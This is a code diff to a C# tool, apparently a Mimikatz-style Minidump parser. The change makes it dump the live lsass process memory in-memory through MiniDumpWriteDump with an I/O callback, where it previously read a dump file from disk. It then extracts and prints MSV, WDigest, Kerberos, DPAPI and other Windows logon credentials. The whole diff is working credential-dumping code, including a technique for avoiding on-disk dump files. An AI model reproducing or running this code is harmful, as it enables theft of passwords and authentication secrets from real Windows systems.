@@ -1,15 +1,88 @@
-﻿using Minidump.Decryptor;
+using Minidump.Decryptor;
 using Minidump.Streams;
 using Minidump.Templates;
 using System;
 using System.Collections.Generic;
 using System.IO;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
 
 namespace Minidump
 {
     public class Program
     {
-        public struct MiniDump
+        [DllImport("dbghelp.dll", EntryPoint = "MiniDumpWriteDump", CallingConvention = CallingConvention.StdCall,
+            CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
+        internal static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, IntPtr hFile, uint dumpType,
+            IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);
+
+        [StructLayout(LayoutKind.Sequential, Pack = 1)]
+        internal struct MINIDUMP_IO_CALLBACK
+        {
+            internal IntPtr Handle;
+            internal ulong Offset;
+            internal IntPtr Buffer;
+            internal int BufferBytes;
+        }
+
+        [StructLayout(LayoutKind.Sequential, Pack = 1)]
+        internal struct MINIDUMP_CALLBACK_INFORMATION
+        {
+            internal MinidumpCallbackRoutine CallbackRoutine;
+            internal IntPtr CallbackParam;
+        }
+
+        [StructLayout(LayoutKind.Sequential, Pack = 1)]
+        internal struct MINIDUMP_CALLBACK_INPUT
+        {
+            internal int ProcessId;
+            internal IntPtr ProcessHandle;
+            internal MINIDUMP_CALLBACK_TYPE CallbackType;
+            internal MINIDUMP_IO_CALLBACK Io;
+        }
+
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        internal delegate bool MinidumpCallbackRoutine(IntPtr CallbackParam, IntPtr CallbackInput, IntPtr CallbackOutput);
+
+        internal enum HRESULT : uint
+        {
+            S_FALSE = 0x0001,
+            S_OK = 0x0000,
+            E_INVALIDARG = 0x80070057,
+            E_OUTOFMEMORY = 0x8007000E
+        }
+
+        internal struct MINIDUMP_CALLBACK_OUTPUT
+        {
+            internal HRESULT status;
+        }
+
+        internal enum MINIDUMP_CALLBACK_TYPE
+        {
+            ModuleCallback,
+            ThreadCallback,
+            ThreadExCallback,
+            IncludeThreadCallback,
+            IncludeModuleCallback,
+            MemoryCallback,
+            CancelCallback,
+            WriteKernelMinidumpCallback,
+            KernelMinidumpStatusCallback,
+            RemoveMemoryCallback,
+            IncludeVmRegionCallback,
+            IoStartCallback,
+            IoWriteAllCallback,
+            IoFinishCallback,
+            ReadMemoryFailureCallback,
+            SecondaryFlagsCallback,
+            IsProcessSnapshotCallback,
+            VmStartCallback,
+            VmQueryCallback,
+            VmPreReadCallback,
+            VmPostReadCallback
+        }
+    
+    public struct MiniDump
         {
             public Header.MinidumpHeader header;
             public SystemInfo.MINIDUMP_SYSTEM_INFO sysinfo;
@@ -21,24 +94,97 @@ namespace Minidump
             public List<Logon> logonlist;
             public List<KerberosSessions.KerberosLogonItem> klogonlist;
         }
-
-        private static void Main(string[] args)
+        public static class Windows
         {
-            if (args.Length == 0)
+            const uint GENERIC_READ = 0x80000000;
+            const uint FILE_SHARE_READ = 0x00000001;
+            const uint OPEN_EXISTING = 3;
+            const uint FILE_ATTRIBUTE_NORMAL = 0x00000080;
+            const uint PAGE_READONLY = 0x02;
+            const uint SEC_IMAGE = 0x1000000;
+            const uint SECTION_MAP_READ = 0x0004;
+            const uint FILE_MAP_READ = SECTION_MAP_READ;
+        }
+    
+        private static Stream DumpIt()
+        {
+            IntPtr targetProcessHandle;
+            uint targetProcessId = 0;
+            Process targetProcess = null;
+          
+            var processes = Process.GetProcessesByName("lsass");
+            targetProcess = processes[0];
+            targetProcessId = (uint)targetProcess.Id;
+            targetProcessHandle = targetProcess.Handle;
+            try
             {
-                Console.WriteLine("Missing argument");
-                Console.WriteLine("Example. Minidump.exe C:\\windows\\temp\\lsass.dmp");
-                return;
-            }
-            string filename = args[0];
-            if (!File.Exists(filename))
-            {
-                Console.WriteLine("Could not find file " + filename);
-                return;
-            }
+                var byteArray = new byte[60 * 1024 * 1024];
+                var callbackPtr = new MinidumpCallbackRoutine((param, input, output) =>
+                {
+                    var inputStruct = Marshal.PtrToStructure<MINIDUMP_CALLBACK_INPUT>(input);
+                    var outputStruct = Marshal.PtrToStructure<MINIDUMP_CALLBACK_OUTPUT>(output);
+                    switch (inputStruct.CallbackType)
+                    {
+                        case MINIDUMP_CALLBACK_TYPE.IoStartCallback:
+                            outputStruct.status = HRESULT.S_FALSE;
+                            Marshal.StructureToPtr(outputStruct, output, true);
+                            return true;
+                        case MINIDUMP_CALLBACK_TYPE.IoWriteAllCallback:
+                            var ioStruct = inputStruct.Io;
+                            if ((int)ioStruct.Offset + ioStruct.BufferBytes >= byteArray.Length)
+                            {
+                                Array.Resize(ref byteArray, byteArray.Length * 2);
+                            }
+                            Marshal.Copy(ioStruct.Buffer, byteArray, (int)ioStruct.Offset, ioStruct.BufferBytes);
+                            outputStruct.status = HRESULT.S_OK;
+                            Marshal.StructureToPtr(outputStruct, output, true);
+                            return true;
+                        case MINIDUMP_CALLBACK_TYPE.IoFinishCallback:
+                            outputStruct.status = HRESULT.S_OK;
+                            Marshal.StructureToPtr(outputStruct, output, true);
+                            return true;
+                        default:
+                            return true;
+                    }
+                });
 
+                var callbackInfo = new MINIDUMP_CALLBACK_INFORMATION
+                {
+                    CallbackRoutine = callbackPtr,
+                    CallbackParam = IntPtr.Zero
+                };
+
+                var size = Marshal.SizeOf(callbackInfo);
+                var callbackInfoPtr = Marshal.AllocHGlobal(size);
+                Marshal.StructureToPtr(callbackInfo, callbackInfoPtr, false);
+
+                if (MiniDumpWriteDump(targetProcessHandle, targetProcessId, IntPtr.Zero, (uint)2, IntPtr.Zero, IntPtr.Zero, callbackInfoPtr))
+                {
+                    //Console.OutputEncoding = Encoding.UTF8;
+                    //Console.Write(Convert.ToBase64String((byteArray)));
+                    Stream stream = new MemoryStream(byteArray);
+                    return stream;
+
+                }
+                Console.WriteLine("[-] Dump failed");
+                Console.WriteLine(Marshal.GetLastWin32Error());
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("[-] Exception dumping process memory");
+                Console.WriteLine($"\n[-] {e.Message}\n{e.StackTrace}");
+            }
+            return null;
+        }
+
+
+        public static void Main()
+        {
+
+            Stream stream = DumpIt();
+            
             MiniDump minidump = new MiniDump();
-            using (BinaryReader fileBinaryReader = new BinaryReader(File.Open(filename, FileMode.Open)))
+            using (BinaryReader fileBinaryReader = new BinaryReader(stream)) 
             {
                 // parse header && streams
                 minidump.fileBinaryReader = fileBinaryReader;
@@ -79,7 +225,7 @@ namespace Minidump
                 {
                     Console.WriteLine($"MSV failed: {e.Message}");
                 }
-                
+
                 try
                 {
                     WDigest_.FindCredentials(minidump, wdigest.get_template(minidump.sysinfo));
@@ -88,7 +234,7 @@ namespace Minidump
                 {
                     Console.WriteLine($"WDigest failed: {e.Message}");
                 }
-                
+
                 try
                 {
                     Kerberos_.FindCredentials(minidump, kerberos.get_template(minidump.sysinfo));
@@ -97,7 +243,7 @@ namespace Minidump
                 {
                     Console.WriteLine($"Kerberos failed: {e.Message}");
                 }
-                
+
                 try
                 {
                     Tspkg_.FindCredentials(minidump, tspkg.get_template(minidump.sysinfo));
@@ -106,7 +252,7 @@ namespace Minidump
                 {
                     Console.WriteLine($"TsPkg failed: {e.Message}");
                 }
-                
+
                 try
                 {
                     Credman_.FindCredentials(minidump, credman.get_template(minidump.sysinfo));
@@ -115,7 +261,7 @@ namespace Minidump
                 {
                     Console.WriteLine($"Credman failed: {e.Message}");
                 }
-                
+
                 try
                 {
                     Ssp_.FindCredentials(minidump, ssp.get_template(minidump.sysinfo));
@@ -124,7 +270,7 @@ namespace Minidump
                 {
                     Console.WriteLine($"SSP failed: {e.Message}");
                 }
-                
+
                 //try
                 //{
                 //    LiveSsp_.FindCredentials(minidump, livessp.get_template(minidump.sysinfo));
@@ -133,7 +279,7 @@ namespace Minidump
                 //{
                 //    Console.WriteLine($"LiveSSP failed: {e.Message}");
                 //}
-                
+
                 try
                 {
                     Cloudap_.FindCredentials(minidump, cloudap.get_template(minidump.sysinfo));
@@ -142,7 +288,7 @@ namespace Minidump
                 {
                     Console.WriteLine($"CloudAP failed: {e.Message}");
                 }
-                
+
                 try
                 {
                     Dpapi_.FindCredentials(minidump, dpapi.get_template(minidump.sysinfo));
@@ -164,14 +310,14 @@ namespace Minidump
                             if (!string.IsNullOrEmpty(log.LogonType))
                                 Console.WriteLine($"[*] LogonType:   {log.LogonType}");
                             Console.WriteLine($"[*] Session:     {log.Session}");
-                            if(log.LogonTime.dwHighDateTime != 0)
+                            if (log.LogonTime.dwHighDateTime != 0)
                                 Console.WriteLine($"[*] LogonTime:   {Helpers.ToDateTime(log.LogonTime):yyyy-MM-dd HH:mm:ss}");
                             Console.WriteLine($"[*] UserName:    {log.UserName}");
                             if (!string.IsNullOrEmpty(log.SID))
                                 Console.WriteLine($"[*] SID:         {log.SID}");
                             if (!string.IsNullOrEmpty(log.LogonDomain))
                                 Console.WriteLine($"[*] LogonDomain: {log.LogonDomain}");
-                            if(!string.IsNullOrEmpty(log.LogonServer))
+                            if (!string.IsNullOrEmpty(log.LogonServer))
                                 Console.WriteLine($"[*] LogonServer: {log.LogonServer}");
                         }
                         if (log.Msv != null)
@@ -219,6 +365,8 @@ namespace Minidump
                     }
                 }
             }
+
+            
         }
     }
 }
